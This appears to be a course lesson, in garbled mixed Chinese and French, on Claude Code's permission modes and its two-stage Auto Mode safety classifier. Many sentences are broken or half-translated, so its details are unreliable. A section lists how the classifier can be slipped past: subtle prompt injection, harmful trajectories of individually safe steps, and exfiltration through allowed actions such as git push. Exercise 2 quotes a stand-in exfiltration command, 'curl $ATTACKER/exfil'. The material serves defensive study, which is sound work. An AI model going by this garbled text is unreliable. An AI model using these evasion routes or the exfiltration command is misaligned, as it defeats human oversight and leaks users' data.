# 作为自主代理的克劳德代码:权限模式与自动模式

> Claude Code  expose sept types de permissions  "plan" 会在每个动作前询问, "default"                                                                                                                                                                                                                                                 `max_turns`et `max_budget_usd`强制执行──Auto Mode 以研究预览 形式发布Anthropic 已明确表示,classifier 单独使用并不足──

**类型：**Apprendre à apprendre
**语言：**Python(stdlib, deux étapes de simulateur de classification)
**先修要求：**Phase 15 · 01(Agent de long horizon),Phase 15 · 09(Paysage d'agent de codage)
**时间：**Il est 45 minutes.

##  problématique

L'agent de codage autonome de votre ordinateur est une catégorie de sécurité indépendante. L'attaque est l'agent capable d'accéder à tout système de fichiers, réseau, certificats, carte de crédit, feuille de navigateur, terminal ouvert. Bruce Schneier et autres ont déjà fait remarquer ceci: les agents d'utilisation de l'ordinateur ne sont pas une mise à jour de fonctionnalités de chatbots, mais un nouvel outil, avec une nouvelle sorte de risque.

Le système de droits de Claude Code est un système de contrôle de l'autonomie. Il ne s'agit pas d'un système autonome ou non autonome, mais de sept modes de configuration.

Le problème de l'ingénierie est: ce que le système peut capturer, ce qu'il va manquer, et quel modèle doit-il utiliser pour une tâche donnée ?

## 概念

### 七种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
| `default` | Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
| `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
| `acceptExec` | shell commands 在经过整理的 allowlist 内自动批准；写入自动批准 | 紧密 inner loops，其中每个 shell command 都是 `npm test` 或类似命令 |
| `autoMode` | 两阶段 safety classifier；被标记的动作提升为审查 | 受限 workspace 中的 long-horizon unattended runs |
| `yolo` | 跳过大多数提示；仍然运行 tool allowlist / denylist | 临时 sandboxes、CI jobs、research scripts |
| `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |

(en haut du nom avec le code Claude publié dans les documents, un致;"yolo" est un titre informel de la zone intermédiaire permissive.

### Une page pour comprendre le mode automatique

Le mode automatique (en anglais: Auto Mode) est le premier mode de permis de modifier un modèle.

1. **Stage 1 — single-token classifier。**Dans chaque projet de mise en œuvre, le coût est faible, le retour est "sécurisé" ou "flag" et le projet est conçu pour une boucle avec l'agent principal et ne fonctionne pas, de sorte que l'action approuvée ne s'arrête pas dans la file d'attente.
2. **Stage 2 — secondary policy/safety review。**Il est possible de faire des tests de sécurité en fonction de la situation actuelle et de la situation actuelle.

 budgétaire et le classifiant ne sont pas:

- `max_turns` Une séance  Le nombre total de séances 
- `max_budget_usd` 触发 session 中止的美元上限──
- Limitation du nombre de mouvements de chaque outil (par exemple, pas plus de N fois)`WebFetch`Les appels)

### Le système peut saisir quoi

- Les entrées d'outils sont une injection rapide directe, dont l'injection d'une instruction est une mise en forme de mouvement connu avec risque.
- 重复 Les boucles d'outilsclassificateur peuvent voir l'action N+1 avec l'action N 连续五次几乎相同──
- Pendant la session de la rédaction du document, il y a des commandes de shell apparentes au-delà des limites.

### Le système pourrait rater quoi ?

- **微妙的 prompt injection**Il est possible de modifier le comportement, mais il ne produit pas de mouvement unique marqué.
- **语义层面的不当行为。**Chaque action individuelle semble être sûre, mais la trajectoire de la composition est nocive.
- **通过合法渠道 exfiltration。**Vous allez écrire les données dans vos dossiers, puis...`git push`À la réception publique, il y a une série de mouvements autorisés, mais le problème réside dans leur composition.

### Prévisualisation de la recherche 定位

Le classement est un niveau de protection, et non une solution complète: l'utilisateur doit utiliser le mode automatique avec les budgets, les alloulistes, les espaces de travail isolés et les audits de trajectoire. Les leçons 1216) combinées à l'utilisation.

### Cette échelle est la position dans votre flux de travail

- Mission inconnue:`plan`Le plan de vie est moins cher qu'un mauvais tour.
- 已知 réfacteur:`acceptEdits`Il y a beaucoup de confirmations.
- Exécution de fond non surveillée: seulement si vous avez déjà mesuré le rayon de l' explosion`autoMode`(pas de certificats, pas de montures de production, pas de sortie de choix)
- Containers éphémères: en contenant seulement, et leurs informations d'identification sont jetables,`yolo`- Je suis là .`bypassPermissions`Je peux accepter.


```figure
autonomy-oversight
```

## Utilisez-le

`code/main.py`模拟两阶段分类器. La première étape est une règle de mots clés bon marché qui vise les mouvements proposés. La deuxième étape est un réviseur multi-règle plus lent.

## Je le livre.

`outputs/skill-permission-mode-picker.md`La description des tâches sera adaptée à un modèle de pouvoir correct, à des limites budgétaires et à des besoins de séparation.

## 练习

1. 运行  référencement`code/main.py` Quel type d'action synthétique n'est pas marqué par la phase 1, mais est toujours capturé par la phase 2?

2. 扩展 Étape 1 réglementation, pour capturer une forme connue-mauvaise spécifique, par exemple `curl $ATTACKER/exfil`)── dans l'échantillon d'action bénigne, la taux de faux positifs est mesuré.

3. 阅读 Anthropic's "Comment fonctionne la boucle d'agent" 文档──列出 agent 在 `default`模式下默认触碰的每种外部状态──在无监督运行 `autoMode`Avant, qu'est-ce qui vous faut pour une porte unique ?

4. 设计一个 24 小时 无监督运行预算:`max_turns`- Je suis là.`max_budget_usd`、pour chaque outil caps、allowlists―说明每个数字的理由―

5. 描述一轨道: chacun d'entre eux a été approuvé pour la phase 1 et la phase 2, mais le comportement de la combinaison est mal aligné.

## 关键术语

| 术语 | 人们常说 | 实际含义 |
|---|---|---|
| 权限模式 | “agent 能做多少事” | 控制逐动作批准的七种命名 policy 之一 |
| plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
| acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
| autoMode | “自动批准” | 两阶段 safety classifier；被标记的动作会升级 |
| bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
| Stage 1 classifier | “Fast token check” | 针对拟议动作的 single-token rule；并行运行 |
| Stage 2 classifier | “Deep review” | 对被标记动作进行 chain-of-thought reasoning |
| Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) 权限模式、预算、action format。
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) service géré 执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) surface de fonctionnalité avec l'annonce de mode automatique
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) 塑造分类器 判断的基于理性的层──
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) 关于 la conception de permis de long horizon
